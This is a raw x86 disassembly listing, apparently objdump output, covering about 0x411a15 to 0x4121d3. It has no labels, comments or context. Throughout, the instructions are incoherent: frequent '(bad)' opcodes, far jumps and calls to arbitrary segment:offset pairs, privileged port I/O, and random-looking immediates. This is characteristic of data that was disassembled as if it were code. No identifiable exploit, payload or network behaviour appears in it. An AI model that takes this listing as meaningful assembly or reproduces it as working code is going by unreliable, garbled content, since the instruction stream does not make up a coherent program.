  411a15:	jb     0x411a1b
  411a17:	jmp    0x3588:0xa5cdf934
  411a1e:	adc    DWORD PTR [ebx+0xedfff1f],esp
  411a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a25:	add    eax,DWORD PTR [edx+0x4c]
  411a28:	stos   DWORD PTR es:[edi],eax
  411a29:	pop    esp
  411a2a:	dec    esi
  411a2b:	xor    eax,0xc57365a4
  411a30:	imul   DWORD PTR [ebx+0x62eaceb1]
  411a36:	dec    edx
  411a37:	xchg   DWORD PTR [esi*8-0x5edfba9],esp
  411a3e:	inc    ebp
  411a3f:	rol    BYTE PTR [edi-0x197a6182],0xee
  411a46:	pop    edi
  411a47:	sub    dl,dh
  411a49:	outs   dx,DWORD PTR ds:[esi]
  411a4a:	lahf   
  411a4b:	iret   
  411a4c:	pop    edi
  411a4d:	pop    esi
  411a4e:	add    eax,0xa1dc52ad
  411a53:	aam    0xbe
  411a55:	loop   0x411ab3
  411a57:	rcl    DWORD PTR ss:[eax-0x2dccb614],0x64
  411a5f:	or     BYTE PTR [esi],al
  411a61:	cmp    dl,BYTE PTR [ecx+0x63]
  411a64:	xchg   ecx,eax
  411a65:	mov    edi,0x4dd1538c
  411a6a:	jmp    0x9f6:0x64df9d30
  411a71:	inc    ecx
  411a72:	jnp    0x411ad0
  411a74:	scas   eax,DWORD PTR es:[edi]
  411a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a76:	pop    ebx
  411a77:	push   cs
  411a78:	scas   al,BYTE PTR es:[edi]
  411a79:	add    DWORD PTR [esp+ebx*4+0x2fb2c236],esi
  411a80:	mov    bl,0xb8
  411a82:	cli    
  411a83:	div    al
  411a85:	retf   
  411a86:	nop
  411a87:	sbb    ah,BYTE PTR [ecx]
  411a89:	xchg   BYTE PTR ds:0xdd851764,ah
  411a8f:	adc    bh,dl
  411a91:	(bad)  
  411a92:	shl    dh,1
  411a94:	leave  
  411a95:	loop   0x411a73
  411a97:	jmp    0x61f658af
  411a9c:	std    
  411a9d:	mov    dl,0x16
  411a9f:	push   es
  411aa0:	pop    esi
  411aa1:	adc    eax,DWORD PTR [esp+ebx*4]
  411aa4:	add    ebx,DWORD PTR [ebp-0x532dc45]
  411aaa:	pop    esp
  411aab:	fcmovnb st,st(6)
  411aad:	mov    edi,0x8d76bb0a
  411ab2:	and    edx,DWORD PTR [edi+0x23a0adce]
  411ab8:	inc    ecx
  411ab9:	lahf   
  411aba:	loope  0x411a89
  411abc:	cmp    DWORD PTR [edi-0x51],edx
  411abf:	mov    cl,0xf
  411ac1:	pop    ebp
  411ac2:	call   0x4c23f77a
  411ac7:	or     BYTE PTR ds:0x165707f2,bh
  411acd:	jecxz  0x411b01
  411acf:	stc    
  411ad0:	out    0x92,eax
  411ad2:	retf   
  411ad3:	xchg   ebx,eax
  411ad4:	clc    
  411ad5:	call   0x9383:0xf1ab11
  411adc:	jb     0x411b28
  411ade:	adc    esp,DWORD PTR [ecx+0x51179513]
  411ae4:	cwde   
  411ae5:	inc    esp
  411ae6:	or     ecx,DWORD PTR ss:[ebp-0xeff06f5]
  411aed:	jmp    0x411b17
  411aef:	sbb    al,0xdb
  411af1:	xor    al,0xf1
  411af3:	fistp  QWORD PTR [eax]
  411af5:	jmp    0xae32de50
  411afa:	fstp   DWORD PTR [esi+0x2d]
  411afd:	jge    0x411aeb
  411aff:	lahf   
  411b00:	repnz cmp al,0xd8
  411b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b04:	rcr    DWORD PTR [esi+0x498f19f2],cl
  411b0a:	fbld   TBYTE PTR [edi+edx*8]
  411b0d:	cwde   
  411b0e:	mov    dl,0xcf
  411b10:	fs das 
  411b12:	xor    BYTE PTR [edx-0x41624c5b],dl
  411b18:	push   edi
  411b19:	adc    eax,0xb0a4af08
  411b1e:	popf   
  411b1f:	in     al,dx
  411b20:	push   ds
  411b21:	xchg   edx,eax
  411b22:	fstp   QWORD PTR [edi+0x742f512d]
  411b28:	and    DWORD PTR ds:0x2ca7fa9a,edi
  411b2e:	je     0x411b27
  411b30:	in     eax,dx
  411b31:	sbb    ebp,ebx
  411b33:	add    BYTE PTR [ebp-0x42b0de89],dl
  411b39:	xchg   DWORD PTR [esi-0x7be32bc0],edi
  411b3f:	push   esp
  411b40:	mov    edx,0xdf10edbc
  411b45:	or     al,0xb9
  411b47:	inc    ecx
  411b48:	test   DWORD PTR [edx],ecx
  411b4a:	add    BYTE PTR [edx-0x457f6740],bl
  411b50:	inc    ecx
  411b51:	lods   al,BYTE PTR ds:[esi]
  411b52:	jbe    0x411b81
  411b54:	lods   al,BYTE PTR ds:[esi]
  411b55:	push   cs
  411b56:	mov    eax,ds:0x390aa1fa
  411b5b:	dec    edx
  411b5c:	mov    eax,0xe0d6e8b3
  411b61:	(bad)  
  411b62:	js     0x411b9c
  411b64:	ss xchg edx,eax
  411b66:	mov    ebx,0x77ec037b
  411b6b:	pop    ebp
  411b6c:	sub    eax,0x40381b51
  411b71:	adc    ebp,edx
  411b73:	lods   eax,DWORD PTR ds:[esi]
  411b74:	adc    al,0x73
  411b76:	fimul  DWORD PTR [ebx]
  411b78:	imul   ebx
  411b7a:	rcl    DWORD PTR ds:0x80bd3c18,cl
  411b80:	inc    eax
  411b81:	mov    ebx,0xba52dd9
  411b86:	dec    ebx
  411b87:	dec    edx
  411b88:	push   ds
  411b89:	mov    eax,0xc9ba9f58
  411b8e:	push   ecx
  411b8f:	into   
  411b90:	jne    0x411bad
  411b92:	xchg   ebx,eax
  411b93:	dec    edi
  411b94:	jle    0x411c08
  411b96:	rcl    DWORD PTR [ebp-0x7e],0xa9
  411b9a:	dec    edi
  411b9b:	shl    ebx,0x64
  411b9e:	adc    eax,0x5bc173a
  411ba3:	jo     0x411b51
  411ba5:	ins    DWORD PTR es:[edi],dx
  411ba6:	bound  eax,QWORD PTR [eax+0x5c]
  411ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411baa:	imul   esp,esi,0x97a3415d
  411bb0:	add    eax,0x42e014f9
  411bb5:	or     al,0xc7
  411bb7:	pop    es
  411bb8:	adc    al,0x4b
  411bba:	mov    ebp,esp
  411bbc:	xlat   BYTE PTR ds:[ebx]
  411bbd:	mov    ebx,0x7cb30308
  411bc2:	jnp    0x411c07
  411bc4:	stc    
  411bc5:	mov    ds:0xec990c0e,eax
  411bca:	fdivp  st(1),st
  411bcc:	mov    al,ds:0xbb66a14c
  411bd1:	or     eax,0xaf629214
  411bd6:	rcl    BYTE PTR [ebp+0x1314931],cl
  411bdc:	les    edi,FWORD PTR [edi+0x6b]
  411bdf:	xchg   edx,eax
  411be0:	stos   DWORD PTR es:[edi],eax
  411be1:	(bad)  
  411be2:	xchg   edx,eax
  411be3:	ds or  al,0xbf
  411be6:	cmp    BYTE PTR [edi],al
  411be8:	or     BYTE PTR [eax+0x12],0xf0
  411bec:	jae    0x411c36
  411bee:	fist   DWORD PTR [ebp+0x786f08e7]
  411bf4:	lea    ecx,[ebx+0x1f]
  411bf7:	int3   
  411bf8:	sbb    ebp,edx
  411bfa:	push   edi
  411bfb:	rol    DWORD PTR [esi+0x64],cl
  411bfe:	das    
  411bff:	push   ecx
  411c00:	(bad)  
  411c01:	jno    0x411c7d
  411c03:	std    
  411c04:	mov    ebp,0xe717a557
  411c09:	lock sbb eax,0x1d26c42e
  411c0f:	ror    DWORD PTR ds:0x1ca91b2d,1
  411c15:	inc    ebp
  411c16:	(bad)  
  411c17:	into   
  411c18:	push   ds
  411c19:	mov    ebp,0x72171021
  411c1e:	mov    bl,0x95
  411c20:	dec    ebp
  411c21:	stos   DWORD PTR es:[edi],eax
  411c22:	sbb    DWORD PTR [ecx+0x6598ad00],edi
  411c28:	pop    esp
  411c29:	dec    ebx
  411c2a:	mov    eax,ds:0x723fdb26
  411c2f:	jb     0x411c1c
  411c31:	adc    BYTE PTR [ebp-0x349fa84a],cl
  411c37:	and    dl,ch
  411c39:	jl     0x411c53
  411c3b:	mov    edx,DWORD PTR [ecx+0xe]
  411c3e:	enter  0xdeda,0xc9
  411c42:	test   DWORD PTR [bx+di+0x31fa],0xf5254284
  411c4b:	jg     0x411be6
  411c4d:	sbb    eax,0x15e0aa80
  411c52:	fcom   st(7)
  411c54:	stos   BYTE PTR es:[edi],al
  411c55:	(bad)  
  411c56:	adc    BYTE PTR [esi-0x7130926d],ah
  411c5c:	cmp    ch,ah
  411c5e:	mov    edx,0x80c850cb
  411c63:	jne    0x411c93
  411c65:	outs   dx,BYTE PTR ds:[esi]
  411c66:	mov    bl,BYTE PTR [ebp+0x4c02f679]
  411c6c:	stc    
  411c6d:	lods   eax,DWORD PTR ds:[esi]
  411c6e:	jle    0x411c22
  411c70:	sbb    eax,0x3f15ed9d
  411c75:	jl     0x411cb0
  411c77:	add    ch,BYTE PTR [eax+0x3544344]
  411c7d:	icebp  
  411c7e:	sti    
  411c7f:	jp     0x411c1c
  411c81:	cmp    al,0xe3
  411c83:	rcr    edi,0xdc
  411c86:	xor    ch,BYTE PTR [ebx+0x4586f1b9]
  411c8c:	inc    edi
  411c8d:	mov    bl,BYTE PTR gs:[esi-0x6ce59d12]
  411c94:	lahf   
  411c95:	in     eax,0x6
  411c97:	jo     0x411c8f
  411c99:	lahf   
  411c9a:	cmp    DWORD PTR [esi-0x2e],ecx
  411c9d:	push   ss
  411c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c9f:	stos   DWORD PTR es:[edi],eax
  411ca0:	adc    eax,0x8c488c03
  411ca5:	repnz gs fs dec edx
  411ca9:	lds    edi,FWORD PTR [edi-0x2d]
  411cac:	outs   dx,BYTE PTR ds:[esi]
  411cad:	mov    bl,0x3d
  411caf:	(bad)  
  411cb0:	iret   
  411cb1:	and    ebx,esi
  411cb3:	repz sub ch,BYTE PTR [ebx]
  411cb6:	mov    dl,0x36
  411cb8:	loopne 0x411d1d
  411cba:	test   al,dh
  411cbc:	adc    DWORD PTR ds:0xbd1faacd,ecx
  411cc2:	int3   
  411cc3:	retf   
  411cc4:	push   ecx
  411cc5:	lahf   
  411cc6:	add    eax,0xc6ed3c2a
  411ccb:	add    bl,bl
  411ccd:	inc    edx
  411cce:	mov    bl,0xd5
  411cd0:	loopne 0x411cb1
  411cd2:	lahf   
  411cd3:	je     0x411d4e
  411cd5:	xchg   DWORD PTR [esi],ebp
  411cd7:	stos   DWORD PTR es:[edi],eax
  411cd8:	push   edi
  411cd9:	cmp    dh,BYTE PTR [ecx+0x6177a862]
  411cdf:	adc    BYTE PTR [edx+edi*4],cl
  411ce2:	popa   
  411ce3:	mov    esp,0x446dc186
  411ce8:	dec    DWORD PTR [ebp+0x79d54c1a]
  411cee:	pop    ds
  411cef:	and    DWORD PTR [ecx-0xe],ebx
  411cf2:	cmc    
  411cf3:	(bad)  
  411cf4:	push   ds
  411cf5:	xor    edx,0x842e8d67
  411cfb:	or     al,0xe9
  411cfd:	mov    ah,0x16
  411cff:	sbb    DWORD PTR [edx+esi*4-0x32339d9b],edi
  411d06:	inc    edx
  411d07:	(bad)  
  411d08:	mov    al,0x7e
  411d0a:	cmp    eax,0xfd7fdfaa
  411d0f:	stc    
  411d10:	mov    WORD PTR [edx],?
  411d12:	dec    esp
  411d13:	xor    ah,bh
  411d15:	pop    es
  411d16:	cwde   
  411d17:	xchg   WORD PTR [esi],di
  411d1a:	mov    bl,0x60
  411d1c:	int3   
  411d1d:	inc    ebp
  411d1e:	mov    dl,0x18
  411d20:	cdq    
  411d21:	inc    esp
  411d22:	cmp    esi,DWORD PTR [ebx]
  411d24:	jmp    0x411d03
  411d26:	enter  0xa893,0x9d
  411d2a:	lahf   
  411d2b:	outs   dx,DWORD PTR ds:[esi]
  411d2c:	push   edx
  411d2d:	mov    ecx,0x14afab05
  411d32:	and    BYTE PTR [ecx+0x54],bh
  411d35:	mov    dh,BYTE PTR [ebx]
  411d37:	xor    edi,DWORD PTR [esi+0x485655f2]
  411d3d:	jle    0x411cd4
  411d3f:	ins    BYTE PTR es:[edi],dx
  411d40:	pop    eax
  411d41:	sub    esi,edx
  411d43:	retf   0x15de
  411d46:	cwde   
  411d47:	in     al,0x77
  411d49:	adc    BYTE PTR [ebp+0x35],0x58
  411d4d:	push   edi
  411d4e:	sbb    eax,0x55a82619
  411d53:	dec    edx
  411d54:	or     eax,0x82854121
  411d59:	call   0xa3fd53c4
  411d5e:	pop    ebx
  411d5f:	aas    
  411d60:	mov    ebx,0x7eaba83f
  411d65:	and    BYTE PTR [ecx],dh
  411d67:	test   al,0x33
  411d69:	fdivr  DWORD PTR [ebx]
  411d6b:	inc    ecx
  411d6c:	xchg   edi,eax
  411d6d:	lea    edi,[esi-0x7f]
  411d70:	sub    esp,DWORD PTR [edx]
  411d72:	ss jbe 0x411dcb
  411d75:	retf   
  411d76:	jae    0x411dae
  411d78:	pop    ecx
  411d79:	adc    edi,DWORD PTR [ebx+ecx*1]
  411d7c:	sub    BYTE PTR [edi+0x72254ff5],bh
  411d82:	jecxz  0x411d2c
  411d84:	jmp    0xbe8aaa2b
  411d89:	mov    ch,0xd7
  411d8b:	je     0x411dbf
  411d8d:	fist   DWORD PTR [ecx]
  411d8f:	sub    BYTE PTR [edx+0x3],cl
  411d92:	jmp    0xb32b945b
  411d97:	out    0xd7,eax
  411d99:	stos   DWORD PTR es:[edi],eax
  411d9a:	mov    esp,DWORD PTR [eax]
  411d9c:	aaa    
  411d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d9e:	jae    0x411d33
  411da0:	xchg   BYTE PTR [esi],bh
  411da2:	imul   ebp,DWORD PTR [ebx],0x7c57c6ec
  411da8:	xchg   BYTE PTR fs:[ebp+0x763bbf20],bh
  411daf:	inc    esi
  411db0:	and    bl,BYTE PTR [ebx]
  411db2:	jmp    0x9d0ae6bb
  411db7:	or     BYTE PTR [ecx+0x14],0x7c
  411dbb:	sbb    BYTE PTR [ecx-0x45ff2aef],cl
  411dc1:	icebp  
  411dc2:	sbb    al,0xa6
  411dc4:	arpl   WORD PTR [esp+ebx*4],di
  411dc7:	sbb    DWORD PTR ds:0x3537e968,ebx
  411dcd:	push   cs
  411dce:	pusha  
  411dcf:	retf   0xf9c9
  411dd2:	aad    0x2c
  411dd4:	inc    edx
  411dd5:	jmp    0xb67216e8
  411dda:	cli    
  411ddb:	out    dx,eax
  411ddc:	div    DWORD PTR ds:0x8c8ea764
  411de2:	jns    0x411d83
  411de4:	sbb    DWORD PTR [edx+0x75cffba5],0xbb98aed7
  411dee:	rol    DWORD PTR [edi-0x1647b0ca],1
  411df4:	mov    ebp,0x323bfafb
  411df9:	push   0xffffff97
  411dfb:	(bad)  
  411dfc:	sub    al,0x7b
  411dfe:	outs   dx,BYTE PTR ds:[esi]
  411dff:	cs jnp 0x411e6a
  411e02:	adc    eax,0xca662f0f
  411e07:	fistp  DWORD PTR [edi-0x7e2ada9e]
  411e0d:	imul   esi,DWORD PTR [eax-0x38166f24],0x3c
  411e14:	push   0x29
  411e16:	mov    dh,0xa
  411e18:	sbb    al,0xd9
  411e1a:	gs inc ebx
  411e1c:	nop
  411e1d:	mov    cl,0xf
  411e1f:	aam    0xf8
  411e21:	clc    
  411e22:	mov    esp,0x24ceeda
  411e27:	popa   
  411e28:	sub    BYTE PTR [ebx-0x69400622],dh
  411e2e:	push   esi
  411e2f:	mov    WORD PTR [eax-0x518ded5c],?
  411e35:	outs   dx,DWORD PTR ds:[esi]
  411e36:	leave  
  411e37:	lods   eax,DWORD PTR ds:[esi]
  411e38:	or     esi,edi
  411e3a:	cmc    
  411e3b:	gs pop ecx
  411e3d:	sub    al,0x3f
  411e3f:	mov    ebx,0x48174588
  411e44:	test   BYTE PTR [esi+0x4e],dl
  411e47:	mov    esi,0xc2a6866f
  411e4c:	push   ebx
  411e4d:	mov    cl,0x69
  411e4f:	or     ebp,DWORD PTR [eax-0x54]
  411e52:	dec    ebx
  411e53:	xchg   ecx,eax
  411e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e55:	or     al,0x49
  411e57:	or     eax,0x5c7f2f0
  411e5c:	jb     0x411ed3
  411e5e:	dec    ebp
  411e5f:	cmp    DWORD PTR [ecx-0x45],ecx
  411e62:	cmp    al,bl
  411e64:	fdiv   DWORD PTR [ebx+eax*8]
  411e67:	cmp    al,0x58
  411e69:	gs rcl edx,cl
  411e6c:	retf   
  411e6d:	adc    al,0x68
  411e6f:	loope  0x411eaf
  411e71:	xor    dl,BYTE PTR [ebp+0x7d2e8beb]
  411e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e78:	repz int 0x72
  411e7b:	jnp    0x411e83
  411e7d:	stc    
  411e7e:	sub    ebp,DWORD PTR [eax+eiz*4]
  411e81:	mov    ds:0x64bd240b,eax
  411e86:	pop    ss
  411e87:	mov    ah,0x7d
  411e89:	inc    eax
  411e8a:	out    0x9d,al
  411e8c:	pop    edi
  411e8d:	scas   al,BYTE PTR es:[edi]
  411e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e8f:	(bad)
  411e92:	jmp    0x411eca
  411e94:	dec    ebp
  411e95:	fcom   DWORD PTR [eax+edx*8+0x4a]
  411e99:	add    al,0x8e
  411e9b:	shl    DWORD PTR ss:[ebp+0x16],cl
  411e9f:	push   ss
  411ea0:	(bad)  
  411ea1:	fild   QWORD PTR [esi]
  411ea3:	mov    ah,0xa0
  411ea5:	fadd   st(1),st
  411ea7:	adc    al,0xd9
  411ea9:	mov    BYTE PTR [ebx-0x5de3eb9f],cl
  411eaf:	inc    edi
  411eb0:	push   ds
  411eb1:	mov    ah,0x18
  411eb3:	sub    DWORD PTR [edx],ebp
  411eb5:	mov    ecx,0xce6f2abb
  411eba:	cli    
  411ebb:	pop    ebp
  411ebc:	outs   dx,DWORD PTR ds:[esi]
  411ebd:	cmp    al,0x5b
  411ebf:	xor    eax,0x849c482a
  411ec4:	lds    esi,FWORD PTR [ebp+0x65]
  411ec7:	mov    cl,0x62
  411ec9:	adc    bh,al
  411ecb:	pop    esp
  411ecc:	pop    esp
  411ecd:	mov    bh,bh
  411ecf:	xchg   ebp,eax
  411ed0:	rcr    DWORD PTR [edx],cl
  411ed2:	and    eax,0x93fdc79a
  411ed7:	inc    ebx
  411ed8:	fnstcw WORD PTR [esi]
  411eda:	and    eax,0xb2953cac
  411edf:	(bad)
  411ee3:	fstp   QWORD PTR [edx]
  411ee5:	add    eax,0x19689f35
  411eea:	(bad)  
  411eeb:	aas    
  411eec:	ds icebp 
  411eee:	xlat   BYTE PTR ds:[ebx]
  411eef:	mov    ebp,ecx
  411ef1:	rol    dl,1
  411ef3:	cmp    ch,0x62
  411ef6:	mov    dl,0x1f
  411ef8:	fsub   QWORD PTR [edi]
  411efa:	lds    esi,FWORD PTR [eax+0x4e]
  411efd:	mov    ds,WORD PTR [edx]
  411eff:	push   edi
  411f00:	adc    DWORD PTR [eax-0x6f],ebp
  411f03:	sub    eax,0x42074382
  411f08:	add    ecx,esp
  411f0a:	lahf   
  411f0b:	cmc    
  411f0c:	and    ah,BYTE PTR [ebx]
  411f0e:	and    edi,DWORD PTR [edx+0x11]
  411f11:	and    dl,dh
  411f13:	jl     0x411e9e
  411f15:	addr16 lock and bh,dh
  411f19:	xor    dl,dl
  411f1b:	(bad)  
  411f1c:	or     eax,0x96891bc1
  411f21:	shl    bh,1
  411f23:	call   0xfca8:0xf0d5e077
  411f2a:	jae    0x411f7d
  411f2c:	mov    edx,0xaf5576a9
  411f31:	mov    ds:0xcfd45f3b,eax
  411f36:	sub    eax,0xa68f88fc
  411f3b:	pop    ecx
  411f3c:	outs   dx,DWORD PTR ds:[esi]
  411f3d:	jae    0x411f0a
  411f3f:	or     DWORD PTR [ebx+0x409bb6b0],esi
  411f45:	arpl   WORD PTR [ecx-0x22],ax
  411f48:	and    ecx,DWORD PTR [eax+ecx*2-0x1486897d]
  411f4f:	xchg   edx,eax
  411f50:	jmp    0x7591:0x32fb1a61
  411f57:	aaa    
  411f58:	mul    edi
  411f5a:	popa   
  411f5b:	pop    es
  411f5c:	ror    BYTE PTR [edi+ecx*1-0x6cd39094],cl
  411f63:	outs   dx,BYTE PTR ds:[esi]
  411f64:	dec    edi
  411f65:	mov    es,WORD PTR [edi-0xb]
  411f68:	lock aam 0x3f
  411f6b:	add    eax,0xe3a7a74c
  411f70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f71:	and    BYTE PTR ds:0xe8f8a662,cl
  411f77:	loope  0x411fa0
  411f79:	push   0xffffffd0
  411f7b:	jecxz  0x411eff
  411f7d:	stos   BYTE PTR es:[edi],al
  411f7e:	pop    edx
  411f7f:	stos   DWORD PTR es:[edi],eax
  411f80:	mov    edx,0x5470f048
  411f85:	xlat   BYTE PTR ds:[ebx]
  411f86:	aad    0xc8
  411f88:	or     dh,bl
  411f8a:	sahf   
  411f8b:	sub    ebp,DWORD PTR [edi+0x63]
  411f8e:	test   eax,0xffd7a10f
  411f93:	add    eax,0x37904e58
  411f98:	sti    
  411f99:	nop
  411f9a:	push   ebp
  411f9b:	xor    al,al
  411f9d:	mov    esp,0xe0b5d1da
  411fa2:	jge    0x411f40
  411fa4:	pop    ebx
  411fa5:	out    dx,eax
  411fa6:	jb     0x41201f
  411fa8:	sbb    al,0x7f
  411faa:	std    
  411fab:	lea    edx,[ecx-0x28]
  411fae:	xchg   esi,eax
  411faf:	leave  
  411fb0:	in     al,0x81
  411fb2:	dec    esp
  411fb3:	xor    al,BYTE PTR [edx+0x264c3bf8]
  411fb9:	adc    DWORD PTR [edi+eiz*2+0x37ccdfe4],edi
  411fc0:	inc    edx
  411fc1:	mov    esi,0xcfadc206
  411fc6:	fs (bad) 
  411fc8:	pop    eax
  411fc9:	cdq    
  411fca:	jecxz  0x411f9d
  411fcc:	fwait
  411fcd:	mov    ds:0xd6c69b0a,al
  411fd2:	mov    ah,0x90
  411fd4:	mov    ebp,0xa4fcc425
  411fd9:	ror    DWORD PTR [edx+0x46],1
  411fdc:	jb     0x41201b
  411fde:	inc    ebp
  411fdf:	mov    esi,0xfb6ff447
  411fe4:	mul    DWORD PTR [esi-0x51c8bc53]
  411fea:	xlat   BYTE PTR ds:[ebx]
  411feb:	je     0x411fbb
  411fed:	inc    edi
  411fee:	xor    DWORD PTR [eax-0x41],edx
  411ff1:	out    0x93,al
  411ff3:	or     ebp,edi
  411ff5:	hlt    
  411ff6:	enter  0x9088,0x5d
  411ffa:	pusha  
  411ffb:	push   cs
  411ffc:	and    cl,0x8a
  411fff:	das    
  412000:	inc    edx
  412001:	jno    0x412000
  412003:	sub    al,0x5
  412005:	xchg   BYTE PTR [ebx],ah
  412007:	mov    edx,DWORD PTR [ebp+0x3d9aad66]
  41200d:	pop    ss
  41200e:	aad    0x59
  412010:	dec    eax
  412011:	dec    eax
  412012:	mov    ds:0xdf686a60,eax
  412017:	pop    ds
  412018:	fisub  DWORD PTR [edx]
  41201a:	pop    ss
  41201b:	mov    ds:0x59e079d0,al
  412020:	inc    eax
  412021:	test   ecx,ebx
  412023:	sbb    bh,al
  412025:	mov    esi,0x1043d04a
  41202a:	loop   0x411ff4
  41202c:	lods   al,BYTE PTR ds:[esi]
  41202d:	outs   dx,DWORD PTR ds:[esi]
  41202e:	jecxz  0x411fed
  412030:	stos   DWORD PTR es:[edi],eax
  412031:	int3   
  412032:	mov    bh,0x68
  412034:	mov    eax,0xa80f6e89
  412039:	cli    
  41203a:	mov    ch,0x8e
  41203c:	les    esp,FWORD PTR [edi]
  41203e:	test   BYTE PTR [edi+0x4d],0xa0
  412042:	push   esp
  412043:	shl    BYTE PTR gs:[ebx-0x7a],0x93
  412048:	leave  
  412049:	push   es
  41204a:	jne    0x41206b
  41204c:	mov    gs,WORD PTR [edi+0x3c]
  41204f:	in     al,dx
  412050:	xchg   ecx,eax
  412051:	mov    al,0x3f
  412053:	icebp  
  412054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412055:	ret    0xb400
  412058:	mov    ah,0x2a
  41205a:	stos   DWORD PTR es:[edi],eax
  41205b:	adc    BYTE PTR [ecx+ebx*2],al
  41205e:	fiadd  WORD PTR [ebx-0x7]
  412061:	jmp    0xc76db5f7
  412066:	mov    WORD PTR [eax+edx*2],gs
  412069:	pop    ebx
  41206a:	repz fnstsw WORD PTR [eax+0x65]
  41206e:	push   ebp
  41206f:	dec    ebx
  412070:	aas    
  412071:	aaa    
  412072:	push   ebp
  412073:	fisttp QWORD PTR [edx+0x85855b0]
  412079:	or     DWORD PTR [ebx],eax
  41207b:	adc    dl,BYTE PTR [edx+0x3c10c2c]
  412081:	sub    eax,DWORD PTR [esi-0x69a3fc72]
  412087:	pusha  
  412088:	in     eax,0x28
  41208a:	push   cs
  41208b:	ja     0x412105
  41208d:	jo     0x41204f
  41208f:	jg     0x41203e
  412091:	xchg   edi,eax
  412092:	xlat   BYTE PTR ds:[ebx]
  412093:	adc    dh,dl
  412095:	gs imul edi,ebx,0x85cd207
  41209c:	inc    ecx
  41209d:	jmp    0xd8ee:0xdfc82caa
  4120a4:	lahf   
  4120a5:	popf   
  4120a6:	ja     0x412047
  4120a8:	xor    al,0x57
  4120aa:	dec    ebx
  4120ab:	jecxz  0x41205f
  4120ad:	xor    BYTE PTR [ebx],al
  4120af:	pop    ss
  4120b0:	pop    ss
  4120b1:	jbe    0x412079
  4120b3:	jnp    0x412123
  4120b5:	add    al,0x67
  4120b7:	ror    DWORD PTR [eax+0x1aff47ce],0x41
  4120be:	mov    bl,0x2b
  4120c0:	add    DWORD PTR [ebp-0x2],esp
  4120c3:	pop    esi
  4120c4:	or     eax,0xc3e6e857
  4120c9:	leave  
  4120ca:	sub    eax,0xb844887c
  4120cf:	enter  0xd03b,0xb8
  4120d3:	daa    
  4120d4:	fiadd  DWORD PTR [eax-0x67b8363d]
  4120da:	sub    DWORD PTR [ecx],eax
  4120dc:	and    DWORD PTR [edx],ebx
  4120de:	enter  0xb6f,0x80
  4120e2:	icebp  
  4120e3:	sub    al,0x85
  4120e5:	(bad)  
  4120e6:	in     eax,0xff
  4120e8:	mov    ch,0x42
  4120ea:	gs sti 
  4120ec:	inc    ecx
  4120ed:	mov    edx,0x44e14ac7
  4120f2:	xor    edi,DWORD PTR [edi]
  4120f4:	jle    0x4120f5
  4120f6:	pop    ebx
  4120f7:	mov    bh,0x2b
  4120f9:	scas   al,BYTE PTR es:[edi]
  4120fa:	outs   dx,DWORD PTR ds:[esi]
  4120fb:	(bad)  
  4120fc:	xchg   ebx,eax
  4120fd:	out    dx,eax
  4120fe:	push   ebx
  4120ff:	outs   dx,BYTE PTR ds:[esi]
  412100:	enter  0x7732,0xc8
  412104:	sub    BYTE PTR [ebp+0x1b363370],dl
  41210a:	sbb    BYTE PTR [ecx],dh
  41210c:	sbb    DWORD PTR [ebp+0x0],eax
  41210f:	or     DWORD PTR [eax],edi
  412111:	je     0x412108
  412113:	mov    ds:0x9f3dbbfe,al
  412118:	mov    edx,0x7901a9e2
  41211d:	or     al,0x6c
  41211f:	js     0x4120a9
  412121:	add    al,0xc6
  412123:	sub    al,0x67
  412125:	xor    cl,BYTE PTR [ecx]
  412127:	ficom  WORD PTR [edi-0xe9a110]
  41212d:	cmp    esp,ebp
  41212f:	mov    gs,edi
  412131:	mov    dx,0xa9ae
  412135:	ror    DWORD PTR [eax-0xabaea10],1
  41213b:	sbb    ecx,eax
  41213d:	xchg   edx,eax
  41213e:	mov    ds:0x3a8b5bc8,eax
  412143:	jno    0x4120e9
  412145:	scas   eax,DWORD PTR es:[edi]
  412146:	pusha  
  412147:	cmp    BYTE PTR [edi+0x4d],ah
  41214a:	or     DWORD PTR [edi+0x1f],esi
  41214d:	outs   dx,BYTE PTR ds:[esi]
  41214e:	mov    ss,WORD PTR [edx+edx*4-0x4b4564ab]
  412155:	nop
  412156:	mov    eax,0x9100cd6b
  41215b:	cwde   
  41215c:	push   cs
  41215d:	jnp    0x41214b
  41215f:	popa   
  412160:	pop    eax
  412161:	mov    ds:0x241b4814,al
  412166:	mov    ch,0x4f
  412168:	or     DWORD PTR [ebp+ebx*1+0x2ec90b13],ebx
  41216f:	(bad)  
  412170:	ficomp DWORD PTR [edx+eiz*8-0x14]
  412174:	or     BYTE PTR [ecx+ebx*4],bh
  412177:	jae    0x41213e
  412179:	add    BYTE PTR [edi+edi*2-0x66],bh
  41217d:	jns    0x4121da
  41217f:	jecxz  0x412173
  412181:	xor    bh,BYTE PTR [esi+edx*8+0x16]
  412185:	frstor [ecx]
  412187:	js     0x4121da
  412189:	ror    ah,cl
  41218b:	pop    esi
  41218c:	(bad)
  41218f:	and    DWORD PTR [ebp-0x3e],eax
  412192:	pop    esp
  412193:	(bad)  
  412194:	scas   al,BYTE PTR es:[edi]
  412195:	cmp    eax,0x92a5626a
  41219a:	nop
  41219b:	xor    edi,eax
  41219d:	cmp    DWORD PTR [edx],eax
  41219f:	xchg   esi,eax
  4121a0:	and    ecx,DWORD PTR [esi]
  4121a2:	stos   BYTE PTR es:[edi],al
  4121a3:	or     al,0xe2
  4121a5:	or     ch,BYTE PTR [edx-0x7f]
  4121a8:	xor    al,0xc4
  4121aa:	lock or BYTE PTR [esi-0x210a3a58],0x2
  4121b2:	iret   
  4121b3:	jge    0x4121b2
  4121b5:	mov    edx,0xd718b688
  4121ba:	js     0x4121d7
  4121bc:	sub    ch,BYTE PTR ss:[eax]
  4121bf:	call   0xbc51:0xde76c0d3
  4121c6:	test   WORD PTR es:[edx+0x66],ax
  4121cb:	mov    esi,0xd34dc20a
  4121d0:	shl    bl,cl
  4121d2:	push   es
  4121d3:	outs   dx,DWORD PTR ds:[esi]
